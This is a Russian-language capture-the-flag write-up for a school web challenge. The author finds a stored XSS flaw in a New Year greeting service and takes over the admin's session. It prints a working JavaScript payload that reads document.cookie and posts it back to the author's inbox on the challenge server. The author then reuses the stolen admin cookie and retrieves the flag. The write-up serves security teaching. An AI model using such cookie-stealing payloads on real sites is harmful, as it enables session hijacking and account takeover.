# Web
## [2.2] Новогоднее поздравление
 > У нас же новый год, верно?
 > Так как в текущих условиях нельзя поздравлять лицом-к-лицу, то мы создали сервис, на котором вы можете отправлять приглашения друг-другу!

 > Говорят, что у админа есть особое поздравление для вас... Только он его отдавать почему-то не хочет. Но с радостью открывает ссылки в поздравлениях для него. 84.201.172.73:12004

 > Кто решит данный таск получит отдельную 5+ с большим коэффициентом. Hint1: Вам нужно получить куку админа. Для этого вспомните все, что мы проходили и пересмотрите задачи на requests, один из сайтов вам поможет.

Категория: `web` `not_easy`

### Решение
Регистрируюсь на сайте. 

Решил протестировать систему приема сообщений на уязвимость XSS. Закинул тестовый payload себе в поздравления:

![01ff57a79a0dcad0b6ea900974bdbff2.png](test_xss.png)

Если на сайте присутствует уязвимость XSS, то мой код выполнится и слово "Получилось" будет красным.

![c1952e4ca063fe04ea7147ae74a0c93b.png](xss_successful.png)

Получилось.

Попробую составить код на javascript, который сворует куки чужого браузера (`document.cookies`) и с помощью POST запроса отправит мне в поздравления.

Смотрю на запрос отправки сообщения:

![d0e63b832fa8e679ec6de31fb215b334.png](post_request.png)

Поле `username` используется для указания ника собеседника, `congr` для указания самого сообщения.

Получившийся XSS код:

```html
<script>var req = new XMLHttpRequest();req.open("POST", "http://84.201.172.73:12004/congr");req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");req.send("username=test&congr="+encodeURIComponent(document.cookie));</script>
```
Тестирую на себе:

![58520ebb793637c0a39e027f02d1a2b8.png](test_xss_payload.png)

![8ee3a460d9ed68237c0bbb55d90f535e.png](xss_payload_test_successful.png)

Работает!

Отправляю админу:

![6dedd39a049aa10e189e4f572d42f2ed.png](send_payload_to_admin.png)

![7fcc9160723edca6e84af57a1e588130.png](admin_cookies.png)

Получил куки, подставил.

![417f816693ec6c84653fe17531d90468.png](cookies.png)

![f07417e63fc409536b22212ef69b17b0.png](admin_panel.png)

`Имя: admin Админ: True` - Я под админом.

Здесь веб за 50.

![14f19ae3737ef24942ed5606b40938a2.png](flag.png)

Все.
### Флаг
`mshp{n3w_y34r_styl3d_xx5_5xpl0iting_i5_s0_funny}`

